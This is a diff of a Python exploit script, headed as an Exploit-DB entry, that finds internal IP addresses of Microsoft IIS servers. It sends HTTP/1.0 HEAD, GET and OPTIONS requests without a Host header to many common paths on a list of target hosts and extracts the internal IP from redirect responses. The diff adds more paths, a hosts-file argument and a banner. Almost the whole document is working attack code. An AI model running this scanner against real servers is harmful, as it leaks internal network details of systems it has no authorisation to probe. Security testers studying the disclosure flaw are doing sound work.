@@ -1,11 +1,32 @@
+# Exploit Title: Optimized IIS-HTTP-Internal-IP-Finder exploit (metasploit)
+# Google Dork: -
+# Date: 2020-05-18
+# Exploit Author: KouroshRZ
+# Vendor Homepage: https://www.microsoft.com
+# Software Link: https://www.microsoft.com/en-us/download/details.aspx?id=48264
+# Version: IIS http webserver 7.5, 8.5, 10 (it depends on configuration)
+# Tested on: windows 
+# CVE : -
+
+
+
+
+# Copyright (c) 2018, Heather Pilkington of rapid7                                      #
+# All rights reserved. 
+# https://www.rapid7.com/db/modules/auxiliary/scanner/http/iis_internal_ip
+
+
+
+
+
 # This exploit is inspired by metasaploit framework module "Microsoft IIS HTTP Internal IP Disclosure"
-# But here I'm gonna try to cover more possible situiations (multiple methods and urls)
+# But here I'm gonna try to cover more possible situiations (multiple methods and urls) with several hosts for input
 # The exploit is simple
-# Just one http request without Host header to a protected directory with removing ending "/"
+# Just one http version 1.0 request without Host header to a protected directory with removing ending "/"
 
 # Hosts list are in format like below
 # <prorocol>://<domain or IP address>:<port>
-# For more info read the example_hosts.txt
+# For more info read the example-hosts.txt
 
 
 from re import compile
@@ -13,14 +34,12 @@ import socket
 from ssl import SSLContext, PROTOCOL_TLS_CLIENT
 from colorama import Fore, Style, Back, init
 from time import sleep
-from sys import stdout
+from sys import stdout, argv
 
 
 init(convert=True)
 stdout_write = stdout.write
 
-hosts_file = "path to example_hosts.txt"
-hosts_list = open(hosts_file, 'r').readlines()
 
 protocol = ''
 server_name = ''
@@ -29,7 +48,7 @@ server_port = ''
 found = False
 
 
-# All we need is 30* redirection to find the internal IP !
+# All we need is some 30* redirection to find the internal IP !
 # These urls may cause a redirecttion
 # If you know specific redirection url in target web server add in the list below
 # remember to remove the ending "/"
@@ -37,6 +56,8 @@ found = False
 
 possible_iis_redirect_urls = [
     '/',
+    '/Upload',
+    '/Content',
     '/aspnet_client',
     '/images',
     '/uploads',
@@ -45,21 +66,62 @@ possible_iis_redirect_urls = [
     '/users',
     '/all',
     '/modules',
-    '/admin'
+    '/admin',
+    '/default.htm',
+    '/default.html',
+    '/default.aspx',
+    '/contents',
+    '/public',
+    '/css',
+    '/js',
+    '/common',
+    '/owa',
 ]
 
 # Our preference http method is HEAD
 # But there may not be any routes for HEAD method 
-# So we try GET method too
+# So we try GET and OPTIONS methods too
 
 http_methods = [
     'HEAD',
-    'GET'
+    'GET',
+    'OPTIONS'
 ]
 
-def enumerate_internal_IP_addresses():
+def enumerate_internal_IP_addresses(hosts_file=''):
 
     global found
+    banner = r"""
+
+    
+         _____  _                 _____       _              _____ _____  _____                                     
+        |  __ \(_)               |_   _|     | |            |_   _|_   _|/ ____|                                    
+        | |  | |___   _____        | |  _ __ | |_ ___         | |   | | | (___                                      
+        | |  | | \ \ / / _ \       | | | '_ \| __/ _ \        | |   | |  \___ \                                     
+        | |__| | |\ V /  __/      _| |_| | | | || (_) |      _| |_ _| |_ ____) |                                    
+        |_____/|_|_\_/ \___|     |_____|_|_|_|\__\___/      |_____|_____|_____/
+
+         _____  _____  _______      __  _______ ______       _   _ ______ _________          ______  _____   _  __
+        |  __ \|  __ \|_   _\ \    / /\|__   __|  ____|     | \ | |  ____|__   __\ \        / / __ \|  __ \ | |/ /
+        | |__) | |__) | | |  \ \  / /  \  | |  | |__        |  \| | |__     | |   \ \  /\  / / |  | | |__)  | ' / 
+        |  ___/|  _  /  | |   \ \/ / /\ \ | |  |  __|       | . ` |  __|    | |    \ \/  \/ /| |  | |  _  / |  <  
+        | |    | | \ \ _| |_   \  / ____ \| |  | |____      | |\  | |____   | |     \  /\  / | |__| | | \ \ | . \ 
+        |_|    |_|  \_\_____|   \/_/    \_\_|  |______|     |_| \_|______|  |_|      \/  \/   \____/|_|  \_\|_|\_\ 
+        
+                                                                                                                 
+                                                                                                                                                                                                       
+    """
+
+    print(banner)
+
+    try:
+        hosts_list = open(hosts_file, 'r').readlines()
+    except OSError as err:
+        print(Fore.BLACK + Back.LIGHTRED_EX)
+        print("    "  + str(err))
+        print(Style.RESET_ALL)
+        return
+
 
     for host in hosts_list:
 
@@ -75,15 +137,13 @@ def enumerate_internal_IP_addresses():
         regex_host_format = compile(r"^https?:\/\/.*:\d+$")
 
         if regex_host_format.match(host) == None:
-            print(Fore.LIGHTRED_EX + "[!] Wrong host format : {}".format(host) + Style.RESET_ALL)
+            print(Fore.LIGHTRED_EX + "\n[!] Wrong host format : {}\n".format(host) + Style.RESET_ALL)
             continue
         
         # host entry parsing parameters
         protocol = host[ : host.find("://")]
         server_name = host[host.find("://") + 3 : host.find(":", 6)]
         server_port = int(host[host.find(":", 7) + 1 : ])
-
-        url = possible_iis_redirect_urls[2]
 
 
         regex_ip = compile(r"^\d+\.\d+\.\d+\.\d+$")
@@ -113,6 +173,7 @@ def enumerate_internal_IP_addresses():
 
             for request in http_requests:
 
+                sleep(0.1)
                 method = request[ : request.find(" ")]
                 url = request[request.find(" ") + 1 : request.find("HTTP") - 1]
 
@@ -138,7 +199,7 @@ def enumerate_internal_IP_addresses():
                     recv = sock_http.recv(1024).decode("utf-8", errors='ignore')
                     response += recv
                 except OSError as err:
-                    print("    " + Fore.BLACK + Back.LIGHTRED_EX + "[-] Some error happened on Receiving data" + Style.RESET_ALL)
+                    print("\n    " + Fore.BLACK + Back.LIGHTRED_EX + "[-] Some error happened on Receiving data" + Style.RESET_ALL)
                     print("    " + str(err))
                     sock_http.close()
                     break
@@ -175,7 +236,7 @@ def enumerate_internal_IP_addresses():
                     sock_http.close()
                     
                     # As soon as we found the Internal IP address, no need for other requests so we break the loop
-                    break
+                    # break
                     
                 sock_http.close()
 
@@ -217,7 +278,7 @@ def enumerate_internal_IP_addresses():
                     recv = ssock.recv(1024).decode("utf-8", errors='ignore')
                     response += recv
                 except OSError as err:
-                    print("    " + Fore.BLACK + Back.LIGHTRED_EX + "[-] Some error happened on Receiving data" + Style.RESET_ALL)
+                    print("\n    " + Fore.BLACK + Back.LIGHTRED_EX + "[-] Some error happened on Receiving data" + Style.RESET_ALL)
                     print("    " + str(err))
                     sock_https.close()
                     ssock.close()
@@ -265,6 +326,12 @@ def enumerate_internal_IP_addresses():
 
             print("\n**************************************************************************************\n")
 
+    return
+
 
 if __name__ == "__main__":
-    enumerate_internal_IP_addresses()
+
+    if len(argv) != 2:
+        print("Usage : python Internal-Ip-Disclosure.py example-hosts.txt")
+    else:
+        enumerate_internal_IP_addresses(argv[1])
